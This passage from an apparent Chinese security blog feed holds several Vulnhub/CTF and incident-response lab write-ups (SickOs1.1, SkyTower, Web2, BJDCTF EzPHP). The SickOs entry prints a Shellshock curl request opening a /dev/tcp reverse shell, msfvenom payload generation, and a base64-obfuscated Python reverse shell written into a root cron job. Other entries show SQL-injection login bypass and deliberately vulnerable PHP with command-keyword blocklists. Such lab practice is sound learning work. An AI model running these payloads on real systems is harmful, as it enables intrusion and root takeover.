<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>gcc shell.c -o &#x2F;tmp&#x2F;update</p>
</blockquote>
<p>之后运行update文件</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来说靶机有点意思，重要的几点就是PUT方式上传木马，反弹shell的时候端口的限用，使用chkrootkit的版本漏洞进行提权</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
  </entry>
  <entry>
    <title>应急响应靶机训练-Web2</title>
    <url>/2024/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="应急响应靶机训练-Web2"><a href="#应急响应靶机训练-Web2" class="headerlink" title="应急响应靶机训练-Web2"></a>应急响应靶机训练-Web2</h2><p>发现 知攻善防实验室公众号里有两个应急响应靶场，练习到了第二个，记录一下<a href="https://mp.weixin.qq.com/s/UHkPwopo0HZ330UKTJyXuw">应急响应靶机训练-Web2</a></p>
<h2 id="挑战内容"><a href="#挑战内容" class="headerlink" title="挑战内容"></a>挑战内容</h2><p>前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。</p>
<p>这是他的服务器系统，请你找出以下内容，并作为通关条件：</p>
<p>1.攻击者的IP地址（两个）？192.168.126.135&#x2F;</p>
<p>2.攻击者的webshell文件名？system.php</p>
<p>3.攻击者的webshell密码？hack6618</p>
<p>4.攻击者的伪QQ号？</p>
<p>5.攻击者的伪服务器IP地址？</p>
<p>6.攻击者的服务器端口？</p>
<p>7.攻击者是如何入侵的（选择题）？</p>
<p>8.攻击者的隐藏用户名？</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>在启动靶机时，如果你的vm版本为16，请将虚拟机的vmx文件改一下<br><img src="https://img-blog.csdnimg.cn/direct/3c01bc81e7db42c69300889a39d46927.png" alt="123"></p>
<p>之后就正常启动靶机了。<br>进入靶机之后先开启phpstudy的服务，然后根据问题寻找答案<br><img src="https://img-blog.csdnimg.cn/direct/e478544a47be41119959900ab91192b0.png" alt="1"><br>查看apache日志文件可以发现攻击者的一个ip为192.168.126.135，<img src="https://img-blog.csdnimg.cn/direct/6eb5a3d931a547c89916ea23d72e0c70.png" alt="13"></p>
<p>将源码拖出来使用D盾扫描得到木马文件system.php文件并且知道了密码<br><img src="https://img-blog.csdnimg.cn/direct/bad401e8c04143d0ad45c1985585813e.png" alt="132"><br>如果要查找隐藏用户，有几种方法：<br>1、查看注册表：win+R输入regedit即可看到隐藏用户<code>hack887$</code><br>2、打开控制面板-&gt;用户账户-&gt;管理账户</p>
<p>然后再文档文件下发现Tencent Files文件夹，看到QQ号<br><img src="https://img-blog.csdnimg.cn/direct/4bc0755d3ce04f5c8cac565d2f71ba84.png" alt="132"><br>打开QQ号文件下的FileRecv文件夹，看到了黑客上传的frp工具，查看配置文件frpc.ini文件</p>
<p><img src="https://img-blog.csdnimg.cn/direct/9f810b7962f14c7f810c950ccb133974.png" alt="465"></p>
<p>到这里还差一个攻击者的另一个ip，我是没找到，看了一下解题思路，另一个IP是使用蓝队工具箱的日志分析工具找到的。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhub-sickos1.1</title>
    <url>/2024/03/08/Vulnhub-sickos1-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打的这两个靶场均涉及到代理，值得学习。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用nmap发现主机192.168.206.152。扫描开了三个端口22，8080，3128，信息如下：<br>:<img src="https://img-blog.csdnimg.cn/direct/ae48518e34cd41b2bace11afe01d6eff.png" alt="123"><br>当访问<code>192.168.206.152:8080</code>的时候发现无响应，8080端口显示的http代理关闭，3128端口是开放的，运行着 Squid HTTP 代理 3.1.19 版本。那么改变一下浏览器的代理就可以访问网站了。</p>
<p><img src="https://img-blog.csdnimg.cn/direct/98f1768860c146a5b3b4cff4e4a65422.png" alt="123"><br>然后访问<a href="http://192.168.206.152/%E3%80%82">http://192.168.206.152/。</a><br>尝试进行目录扫描，发现在使用kali进行目录扫描时并无响应<br><img src="https://img-blog.csdnimg.cn/direct/e5ead531f9134d7ea64dfd897ee0cf39.png" alt="123"></p>
<p>在扫描时也要通过代理：<code>dirsearch -u http://192.168.206.152/ --proxy http://192.168.206.152:3128</code>或者<code>dirb http://192.168.206.152/ -p http://192.168.206.152:3128</code><br>扫描到robots.txt,存在wolfcms目录<br><img src="https://img-blog.csdnimg.cn/direct/9fc16baeeadd44c39eead7dada2c2f8a.png" alt="123"><br>继续进行深度目录扫描，没有找到后台登陆入口，网上搜索一下相关漏洞:<a href="https://cloud.tencent.com/developer/article/1047292">Wolf CMS 新旧两个版本中的文件上传漏洞分析
</a><br>找到后台入口&#x2F;wolfcms&#x2F;?&#x2F;admin，弱密码admin&#x2F;admin<br>在file下上传反弹shell的PHP文件<br><img src="https://img-blog.csdnimg.cn/direct/dd497660c3bf487fa0b7be670c61302d.png" alt="123"></p>
<p>kali开启监听6666，靶机访问该文件<code>http://192.168.206.152/wolfcms/public/shell.php</code><br><img src="https://img-blog.csdnimg.cn/direct/26ed64e38a5b4853a17b66f5c56e6885.png" alt="123"></p>
<p>找敏感文件，发现wolfcms&#x2F;config.php文件中存在数据库账号密码<br><img src="https://img-blog.csdnimg.cn/direct/d5fe75fb34fb4461bf42a05b1d6443c9.png" alt="123"><br>尝试进行连接发现无法连接，继续收集信息发现存在用户sickos，尝试使用数据库密码切换到该用户ssh远程登陆<br><img src="https://img-blog.csdnimg.cn/direct/f042fb306fc7439d8240dd07c363f71d.png" alt="123"><br>发现具有sudo所有权限<br><img src="https://img-blog.csdnimg.cn/direct/b6351fce09ef4499a6537657165a104c.png" alt="123"><br>直接sudo &#x2F;bin&#x2F;bash，拿到root权限<br><img src="https://img-blog.csdnimg.cn/direct/031d061fb5324d9db4fb41cf80fb3a36.png" alt="123"><br>至此结束！</p>
<h2 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h2><p>有发现网上有第二种解法，复现一下<br>他这里使用nikto扫描到漏洞<br><code>nikto -h 192.168.206.152 -useproxy http://192.168.206.152:3128</code><br><img src="https://img-blog.csdnimg.cn/direct/3cb32fd75d434632817244fdf89f3ac9.png" alt="798"></p>
<p>发现破壳漏洞cve-2014-6271</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先检测漏洞是否存在<br><code>sudo curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/echo; exit&quot;&quot;</code><br><img src="https://img-blog.csdnimg.cn/direct/f0f51a6b375c4f4280e4e79d97ac8215.png" alt="123"></p>
<p>成功执行。</p>
<h3 id="shellshock漏洞利用"><a href="#shellshock漏洞利用" class="headerlink" title="shellshock漏洞利用"></a>shellshock漏洞利用</h3><h4 id="msfvenom反弹shell"><a href="#msfvenom反弹shell" class="headerlink" title="msfvenom反弹shell"></a>msfvenom反弹shell</h4><p>使用msf来生成反弹马<br><img src="https://img-blog.csdnimg.cn/direct/579ef83031714acbb7162a8a9c8751b4.png" alt="123"><br>执行命令：<code>curl -v --proxy http://192.168.206.152:3128 http://192.168.206.152/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;120-;exec 120&lt;&gt;/dev/tcp/192.168.206.138/6666;/bin/bash &lt;&amp;120 &gt;&amp;120 2&gt;&amp;120&quot;</code><br>如果一次不行可以多试几次，kali监听端口<code>nc -lnvp 6666</code><br>反弹成功后查看权限为www-data</p>
<h4 id="定时任务进行提权"><a href="#定时任务进行提权" class="headerlink" title="定时任务进行提权"></a>定时任务进行提权</h4><p>在&#x2F;var&#x2F;www目录下发现文件connect.py文件，而且文件权限是777<br><code>-rwxrwxrwx  1 root     root      109 Dec  5  2015 connect.py</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">print</span> <span class="token string">"I Try to connect things very frequently\n"</span>
<span class="token keyword">print</span> <span class="token string">"You may want to try my services"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>意思是涉及到定时任务？搜索一下，定时任务文件文件名通常带有<strong>cron</strong>，到&#x2F;etc目录下查找一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc$ <span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span>
<span class="token function">ls</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cron"</span>
cron.d
cron.daily
cron.hourly
cron.monthly
cron.weekly
<span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后发现cron.d目录下的automate文件中内容</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token function">cat</span> auto*
<span class="token function">cat</span> auto*

* * * * * root /usr/bin/python /var/www/connect.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>定时执行connect.py文件<br>msfvenom生成反弹shellpayload<br><code>msfvenom -p cmd/unix/reverse_python LHOST=192.168.206.138 LPORT=4444 -f raw</code><br><img src="https://img-blog.csdnimg.cn/direct/28429ce94bbc46aa8b8c96af7cfe01e7.png" alt="123"></p>
<p>写入文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@SickOs:/etc/cron.d$ <span class="token builtin class-name">echo</span> <span class="token string">"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"</span> <span class="token operator">>></span> /var/www/connect.py
<span class="token operator">&lt;</span>KCIvYmluL2Jhc2giKQ<span class="token operator">==</span><span class="token string">')[0]))" >> /var/www/connect.py                         
www-data@SickOs:/etc/cron.d$ cat /var/www/connect.py
cat /var/www/connect.py
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
exec(__import__('</span>base64<span class="token string">').b64decode(__import__('</span>codecs<span class="token string">').getencoder('</span>utf-8<span class="token string">')('</span>aW1wb3J0IHNvY2tldCAgICAgLCAgICBzdWJwcm9jZXNzICAgICAsICAgIG9zOyAgICAgICAgaG9zdD0iMTkyLjE2OC4yMDYuMTM4IjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgLCAgICBzb2NrZXQuU09DS19TVFJFQU0pOyAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAsICAgIHBvcnQpKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAxKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgLCAgICAyKTsgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ<span class="token operator">==</span>'<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后kali监听4444端口，等待片刻。。。<br><img src="https://img-blog.csdnimg.cn/direct/b33aca2418054003a3ea827c420348af.png" alt="123"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhub-SKYTOWER</title>
    <url>/2024/03/02/Vulnhub-SKYTOWER/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用nmap扫描主机进行信息收集</p>
<blockquote>
<p>nmap 192.168.206.151 -p- -A -SV</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-03-02 <span class="token number">14</span>:11 CST
Stats: <span class="token number">0</span>:00:05 elapsed<span class="token punctuation">;</span> <span class="token number">0</span> hosts completed <span class="token punctuation">(</span><span class="token number">1</span> up<span class="token punctuation">)</span>, <span class="token number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="token number">7.96</span>% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: <span class="token number">14</span>:12 <span class="token punctuation">(</span><span class="token number">0</span>:00:23 remaining<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.151
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00070s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE    SERVICE    VERSION
<span class="token number">22</span>/tcp   filtered <span class="token function">ssh</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>     http       Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: Apache/2.2.22 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token number">3128</span>/tcp <span class="token function">open</span>     http-proxy Squid http proxy <span class="token number">3.1</span>.20
<span class="token operator">|</span>_http-title: ERROR: The requested URL could not be retrieved
<span class="token operator">|</span>_http-server-header: squid/3.1.20
MAC Address: 00:0C:29:82:E8:ED <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">3</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux <span class="token number">3.2</span> - <span class="token number">3.10</span>, Linux <span class="token number">3.2</span> - <span class="token number">3.16</span>
Network Distance: <span class="token number">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.70</span> ms <span class="token number">192.168</span>.206.151

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">40.61</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>信息整理：<br>开放端口：22（ssh） 80（http） 3128（代理端口）</p>
<h2 id="web页面"><a href="#web页面" class="headerlink" title="web页面"></a>web页面</h2><p>访问80端口进行目录扫描发现三个文件<br><img src="https://img-blog.csdnimg.cn/direct/51b00da8b31a487d9db8779f35d5f1cc.png" alt="123"><br>主页面是一个登录窗口<br><img src="https://img-blog.csdnimg.cn/direct/382e43ac70da4eca993b41258eb05430.png" alt="213"><br>尝试进行弱口令登录无果，测试SQL注入。<br>发现存在sql注入<br><img src="https://img-blog.csdnimg.cn/direct/5e8ab8649f634da29b8532146ff9682f.png" alt="123"><br>多次测试后发现可以成功登录<br><img src="https://img-blog.csdnimg.cn/direct/8930a7299c664de388f3ba4d37932f72.png" alt="456"><br>给出了账号密码<code>john/hereisjohn</code><br><img src="https://img-blog.csdnimg.cn/direct/67a0398fa2284aae8891c68881d059e1.png" alt="45"><br>使用该账号密码登录网页不行，ssh也无反应，想起收集信息时发现3128端口开启了代理，那么使用代理工具proxytunnel进行访问。</p>
<h2 id="proxytunnel"><a href="#proxytunnel" class="headerlink" title="proxytunnel"></a>proxytunnel</h2><p>proxytunnel是一款利用http connection封装技术建立隧道的工具。<br>适用条件<br>防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景。</p>
<p>proxytunnel常用命令<br>-a                   指定本地侦听端口</p>
<p>-p                   使用代理</p>
<p>-r                    使用第二个代理</p>
<p>-d                   指定访问的目标和端口<br>kali自带该工具</p>
<blockquote>
<p><code>proxytunnel  -p 192.168.206.151:3128 -d 127.0.0.1:22 -a 6666</code></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/9562b8ee604943e3ba8a07e2c8001a11.png" alt="123"></p>
<h2 id="连接ssh"><a href="#连接ssh" class="headerlink" title="连接ssh"></a>连接ssh</h2><p>开启建立后打开另一个终端进行ssh连接，发现连接上之后就会立即断开<br><img src="https://img-blog.csdnimg.cn/direct/134e48a161034a7583f63e5f25585fcf.png" alt="456"></p>
<p>涉及到了<code>.bashrc</code>文件，在加载shell的时候由于<code>.bashrc</code>文件的配置，bash 在每次启动时都会加载 .bashrc 文件的内容。每个用户的 home 目录都有这个 shell 脚本。它用来存储并加载你的终端配置和环境变量。<br>有可能<code>.bashrc</code>文件写有关闭shell的内容，这里有两个方法：<br>第一：删除.bashrc文件（有风险）<br>第二：使用-t 来开启一个终端</p>
<blockquote>
<p>ssh <a href="mailto:&#x6a;&#111;&#x68;&#110;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;">&#x6a;&#111;&#x68;&#110;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;</a> -p 6666 -t “&#x2F;bin&#x2F;&#x2F;sh” </p>
</blockquote>
<p>使用第二种<br>连接完成之后对靶机进行信息收集，找到login.php中存在数据库账号密码<br><img src="https://img-blog.csdnimg.cn/direct/80429c4272d7467bb82055fef168896a.png" alt="456"><br>连接数据库后发现另外两个用户，查看&#x2F;home下确实存在。<br><img src="https://img-blog.csdnimg.cn/direct/0eca6ffdb4534c6f9d9737e315693be4.png" alt="123"></p>
<p>sara可以连接，william不可以。连接后发现sara用户存在一定的root权限<br><img src="https://img-blog.csdnimg.cn/direct/f7fd2f112f864ce0bd1ae9d831d95ab0.png" alt="789"><br>查看root目录下的flag.txt文件发现有root密码<br><img src="https://img-blog.csdnimg.cn/direct/837b5f62fa1842188b881a0b00844608.png" alt="456"><br>连接ssh，拿到flag。<br><img src="https://img-blog.csdnimg.cn/direct/472f4411a17e45bbad93ea73a3468ef7.png" alt="456"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以SQL注入为入口找到账号密码，搭建代理隧道后连接ssh，在login.php文件下发现数据库账号密码。通过数据库查到其他用户的账号密码，发现sara用户存在root权限，在root下发现root密码，然后连接ssh拿到root下的flag。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
  </entry>
  <entry>
    <title>BJDCTF2020-EzPHP</title>
    <url>/2024/03/01/BJDCTF2020-EzPHP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>这道题真的不错哎😔，复现一下<br>打开题目后查看源码发现起那面有一段密文，base32解密后为一个文件名<strong>1nD3x.php</strong>，访问该文件：（看到大段的就像shi~~）<br>源码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1nD3x.php"</span><span class="token punctuation">;</span>
<span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
